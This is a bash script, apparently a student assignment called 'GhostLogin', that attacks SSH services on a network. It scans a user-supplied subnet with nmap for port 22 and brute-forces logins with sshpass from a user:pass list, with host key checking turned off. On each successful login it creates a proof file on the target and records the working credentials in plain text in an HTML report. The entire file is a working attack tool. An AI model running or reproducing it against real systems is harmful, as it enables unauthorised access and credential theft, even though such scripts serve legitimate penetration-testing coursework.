#!/bin/bash
# ==============================================================================
# Project: GhostLogin - Automated SSH Exposure and Attack
# Program Code: NX201
# Student Name: yonatan avitan
# Student Code: s20
# Class Code: 7736-39
# Lecturer Name: zach azolis
# ==============================================================================
# Creativity Added: Automated Beautiful HTML Report Generation for Easy PDF Export.
# This fulfills the requirement for an intentional, documented upgrade.
# ==============================================================================

REPORT_FILE="GhostLogin_Report.html"
FOUND_HOSTS="ssh_hosts.txt"

# ------------------------------------------------------------------------------
# 1. User Input and Validation
# ------------------------------------------------------------------------------
echo -e "\e[1;36m[+] Welcome to GhostLogin Automated SSH Assesment\e[0m"
read -p "Enter IP range or subnet to scan (e.g., 192.168.1.0/24): " TARGET_IP

if [[ ! $TARGET_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(/[0-9]+)?$ ]]; then
    echo -e "\e[1;31m[-] Invalid IP format. Exiting.\e[0m"
    exit 1
fi

# ------------------------------------------------------------------------------
# 2. Scanning for SSH Services
# ------------------------------------------------------------------------------
echo -e "\e[1;34m[*] Scanning $TARGET_IP for active SSH services (Port 22)...\e[0m"
nmap -p 22 --open -oG - "$TARGET_IP" | awk '/Up$/{print $2}' > "$FOUND_HOSTS"

if [ ! -s "$FOUND_HOSTS" ]; then
    echo -e "\e[1;31m[-] No SSH services found. Exiting.\e[0m"
    exit 0
fi

echo -e "\e[1;32m[+] Discovered SSH hosts:\e[0m"
cat "$FOUND_HOSTS"

# ------------------------------------------------------------------------------
# 3. Credential Brute Forcing
# ------------------------------------------------------------------------------
read -p "Provide path to credentials file (format: user:pass) or press Enter to use your pass.txt: " CREDS_FILE

# Defaults directly to your working pass.txt file if you just press Enter
if [ -z "$CREDS_FILE" ]; then
    CREDS_FILE="pass.txt"
fi

if [ ! -f "$CREDS_FILE" ]; then
    echo -e "\e[1;31m[-] Credentials file not found.\e[0m"
    exit 1
fi

# Start building the BEAUTIFUL HTML Report
echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>GhostLogin Report</title>" > $REPORT_FILE
echo "<style>body{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f9; color: #333; margin: 40px;} h1{color: #0056b3; border-bottom: 2px solid #0056b3; padding-bottom: 10px;} .metadata{background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-bottom: 20px;} table{border-collapse: collapse; width: 100%; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1);} th, td{border: 1px solid #ddd; padding: 12px; text-align: left;} th{background-color: #0056b3; color: white;} .success{background-color: #d4edda; color: #155724;} .fail{background-color: #f8d7da; color: #721c24;}</style></head><body>" >> $REPORT_FILE
echo "<h1>GhostLogin Execution Report</h1>" >> $REPORT_FILE
echo "<div class='metadata'><p><strong>Student:</strong> yonatan avitan (s20)</p><p><strong>Class:</strong> 7736-39</p></div>" >> $REPORT_FILE
echo "<table><tr><th>Target IP</th><th>Credential</th><th>Login Status</th><th>Command Execution</th></tr>" >> $REPORT_FILE

echo -e "\e[1;34m[*] Starting Brute Force and Post-Exploitation...\e[0m"

# Read each host
while read -r IP; do
    LOGIN_SUCCESS=false
    while IFS=: read -r USER PASS; do
        if [ "$LOGIN_SUCCESS" = true ]; then break; fi

        echo "Trying $USER:$PASS on $IP..."
        
        # ------------------------------------------------------------------------------
        # 4. Post-Exploitation Automation
        # ------------------------------------------------------------------------------
        sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$USER@$IP" "touch .ghostlogin_proof && echo 'Success'" 2>/dev/null > command_output.tmp
        
        if grep -q 'Success' command_output.tmp; then
            echo -e "\e[1;32m[+] SUCCESS! Host: $IP | Creds: $USER:$PASS\e[0m"
            echo "<tr class='success'><td>$IP</td><td>$USER:$PASS</td><td>Success</td><td>.ghostlogin_proof created</td></tr>" >> $REPORT_FILE
            LOGIN_SUCCESS=true
        fi
        rm -f command_output.tmp
    done < "$CREDS_FILE"

    if [ "$LOGIN_SUCCESS" = false ]; then
         echo "<tr class='fail'><td>$IP</td><td>N/A</td><td>Failed</td><td>None</td></tr>" >> $REPORT_FILE
    fi

done < "$FOUND_HOSTS"

echo "</table></body></html>" >> $REPORT_FILE

# ------------------------------------------------------------------------------
# 5. Output and Reporting
# ------------------------------------------------------------------------------
echo -e "\e[1;36m=================================================================\e[0m"
echo -e "\e[1;32m[+] Scan and Brute Force Complete.\e[0m"
echo -e "\e[1;32m[+] BEAUTIFUL Report generated: $REPORT_FILE\e[0m"
echo -e "\e[1;36m=================================================================\e[0m"

# Clean up
rm -f "$FOUND_HOSTS"
